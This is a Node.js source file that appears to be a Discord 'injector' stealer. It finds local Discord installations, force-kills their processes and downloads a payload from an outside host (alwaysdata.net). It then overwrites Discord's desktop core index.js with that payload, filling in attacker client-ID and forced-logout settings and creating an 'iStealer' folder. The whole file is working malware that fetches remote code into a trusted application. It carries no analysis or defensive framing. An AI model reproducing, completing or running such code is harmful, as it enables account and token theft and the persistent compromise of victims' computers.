var glob = require("glob");
const fs = require('fs');
const https = require('https');
const {
    exec
} = require('child_process');
const superstarlmao = "%CLIENTIDD%"
const config = {
    "logout": "%ClientLogoutt%",
    "logout-notify": "true",
    "disable-qr-code": "true"
}
var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];
fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});
discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
});
listDiscords();
function Infect() {
    https.get('https://external.alwaysdata.net/is/files/v2/get.txt', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%ClientID%", superstarlmao).replace("%ClientLogout%", config["ClientLogoutt"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if (config.logout != "false") {
                    let folder = file.replace("index.js", "iStealer")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            //
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant") {
                        //
                    }
                }
            })
        });
    }).on("error", (err) => {
        console.log(err);
    });
};
function listDiscords() {
    exec('tasklist', function(err, stdout, stderr) {
        if (stdout.includes("Discord.exe")) {
            runningDiscords.push("Discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {
            runningDiscords.push("DiscordCanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {
            runningDiscords.push("DiscordDevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {
            runningDiscords.push("DiscordPTB")
        };
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0) {
                killDiscord();
            }
            Infect()
        }
    })
};
function killDiscord() {
    exec("taskkill /f /im discord.exe");
    exec("taskkill /f /im discordcanary.exe");
    exec("taskkill /f /im discordptb.exe");
    exec("taskkill /f /im discorddevelopment.exe");
    Infect()
};
